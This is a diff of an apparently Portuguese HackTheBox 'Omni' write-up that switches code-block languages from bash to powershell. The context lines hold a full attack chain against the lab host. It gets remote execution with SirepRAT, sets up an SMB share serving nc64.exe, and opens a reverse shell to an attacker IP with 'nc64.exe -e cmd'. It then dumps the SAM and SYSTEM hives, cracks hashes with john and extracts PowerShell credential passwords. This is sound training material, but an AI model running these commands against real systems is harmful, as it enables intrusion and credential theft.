@@ -202,7 +202,7 @@
 </blockquote>
 <p><img src="Assets/HTB-Windows-Easy-omni/win_IoT_Core.jpg" alt="Windows IoT Core" /></p>
 <h1 id="exploração"><a class="header" href="#exploração">Exploração</a></h1>
-<pre><code class="language-bash">git clone https://github.com/SafeBreach-Labs/SirepRAT.git
+<pre><code class="language-powershell">git clone https://github.com/SafeBreach-Labs/SirepRAT.git
 cd SirepRAT
 
 sudo python3 setup.py install
@@ -212,7 +212,7 @@ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &
 </code></pre>
 <p>The command give us an output that looks good. But we can confirm if we have RCE with a better combo!</p>
 <p>O comando retorna um output que parece convincente. Mas é preciso confirmar se temos realmente <strong>Remote Code Execution (RCE)</strong>. Para isso, podemos enviar uma traça ICMP para a nossa própria máquina Kali, ficando a escuta do lado do kali.</p>
-<pre><code class="language-bash"># Capturando todas as comunicações ICMP (Pings) entrando e saindo pelo tun0 (VPN do HackTheBox)
+<pre><code class="language-powershell"># Capturando todas as comunicações ICMP (Pings) entrando e saindo pelo tun0 (VPN do HackTheBox)
 sudo tcpdump -i tun0 icmp
 
 # Execução remota na máquina alvo, para que nos &quot;pingue&quot; a nossa máquina Kali
@@ -225,7 +225,7 @@ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &
 <li>Tentei com IEX e com IWR do Powershell, mas também sem sucesso (também não existem)</li>
 <li>Criei um servidor samba no meu Kali, com smbserver, onde disponibilizava um nc64.exe.</li>
 </ul>
-<pre><code class="language-bash"># SMB Server
+<pre><code class="language-powershell"># SMB Server
 sudo smbserver.py smbFolder $(pwd) -user javali -password javali -smb2support
 
 # NC listener
@@ -242,7 +242,7 @@ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &
 <h2 id="enumeração-do-sistema"><a class="header" href="#enumeração-do-sistema">Enumeração do sistema</a></h2>
 <p>Para todos os CaptureTheFlag, o objectivo é conseguir ler a <em>flag</em> (user.txt e root.txt)</p>
 <p>Se tivermos privilégios suficientes, podemos encontrá-los através de um simples comando:</p>
-<pre><code class="language-bash">cd C:\
+<pre><code class="language-powershell">cd C:\
 # Procura recursiva da referida string, a partir da pasta onde nos encontramos:
 dir /r /s user.txt  # user.txt : C:\Data\Users\app
 dir /r /s root.txt  # root.txt : C:\Data\Users\administrator
@@ -257,7 +257,7 @@ icacls C:\Data\Users\administrator\root.txt  # NT AUTHORITY\SYSTEM:(I)(F)
 											 # OMNI\Administrator:(I)(F)
 </code></pre>
 <p>O proximo passo é migrar de usuários. Neste momento nós estamos com um usuário do Windows Device Portal, e não como usuário da máquina alvo. Esse tipo de usuário pode executar alguns comando no sistema mas tem um poder muito maior. Tem privilégios para verificar a memória RAM do sistema. Isso significa que podemos extrair o HKLM\System e o HKLM\Sam para recuperar informações dos usuários locais (uid:rid:lmhash:nthash)</p>
-<pre><code class="language-bash">reg save HKLM\SYSTEM SYSTEM.bak  # The operation completed successfully.
+<pre><code class="language-powershell">reg save HKLM\SYSTEM SYSTEM.bak  # The operation completed successfully.
 reg save HKLM\SAM SAM.bak        # The operation completed successfully.
 
 # Copiar os dois novos ficheiros para o nosso Kali
@@ -280,7 +280,7 @@ secretsdump.py -sam SAM.bak -system SYSTEM.bak LOCAL
 #&gt;  [*] Cleaning up...
 </code></pre>
 <p>Com esses hashes, podemos tentar crackear as passwords com a ferramenta &quot;john the ripper&quot;, e a tão famosa wordlist &quot;rockyou.txt&quot;.</p>
-<pre><code class="language-bash">echo &quot;Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::
+<pre><code class="language-powershell">echo &quot;Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::
@@ -295,7 +295,7 @@ john --format=NT --show hashes  # app:mesh5143
 <p><img src="Assets/HTB-Windows-Easy-omni/http_logged.png" alt="http logged" /></p>
 <p><img src="Assets/HTB-Windows-Easy-omni/RCE_website.png" alt="RCE website" /></p>
 <p>Podemos executar commandos diretamente do Windows Device Portal, Mas é sempre melhor ter uma verdadeira reverse shell... Não sei porquê, mas não consegui executar o reverse shell diretamente do samba server, mas, ainda com a shell já aberta, podemos copiar o nc64.exe para uma pasta local. Eu escolho sempre o C:\Windows\System32\spool\drivers\color\ porque praticamente nunca está bloqueado (ver applocker bypass)</p>
-<pre><code class="language-bash"># Ainda com o usuário omni
+<pre><code class="language-powershell"># Ainda com o usuário omni
 copy \\10.10.14.16\smbFolder\nc64.exe C:\Windows\System32\spool\drivers\color\nc64.exe
 
 # Com o usuário app, a partir do website
@@ -305,7 +305,7 @@ C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.16 443
 <p>Na pasta raiz do usuário &quot;app&quot;, podemos ver a flag user.txt, mas também vemos um outro ficheiro estranho: iot-admin.xml. O ficheiro contém o seguinte:</p>
 <p><img src="Assets/HTB-Windows-Easy-omni/SS-file.png" alt="ss-files" /></p>
 <p>Este tipo de ficheiro é uma Credencial de Powershell. Para extrair o campo Password, podemos fazer o seguinte:</p>
-<pre><code class="language-bash">(Import-CliXml -Path iot-admin.xml).GetNetworkCredential().password
+<pre><code class="language-powershell">(Import-CliXml -Path iot-admin.xml).GetNetworkCredential().password
 #&gt; _1nt3rn37ofTh1nGz
 # Isto poderá ser a palavra chave do administrator.
 # administrator:_1nt3rn37ofTh1nGz
@@ -317,11 +317,11 @@ C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.16 443
 <p>Com a nova credencial, podemos efectuar o login no website enquanto administrador do sistema</p>
 <p><img src="Assets/HTB-Windows-Easy-omni/web-administrator.png" alt="web administrator logged" /></p>
 <p>Agora podemos estabelecer um reverse shell com o mesmo binário do nc64.exe já transferido</p>
-<pre><code class="language-bash">C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.16 443
+<pre><code class="language-powershell">C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.16 443
 </code></pre>
 <p><img src="Assets/HTB-Windows-Easy-omni/administrator-reverse-shell.png" alt="administrator reverse shell" /></p>
 <p>E para a flag root.txt, vamos usar outra vez a mesma técnica para extrair o campo Password do ficheiro de Credencial do Powershell.</p>
-<pre><code class="language-bash">type root.txt  # As propriedades são ainda as mesmas: 'UserName' e 'Password'
+<pre><code class="language-powershell">type root.txt  # As propriedades são ainda as mesmas: 'UserName' e 'Password'
 (Import-CliXml -Path root.txt).GetNetworkCredential().Password
 #&gt; 5dbdce5569e2c47.................    (Esta é a flag parcial de root.txt)
 </code></pre>
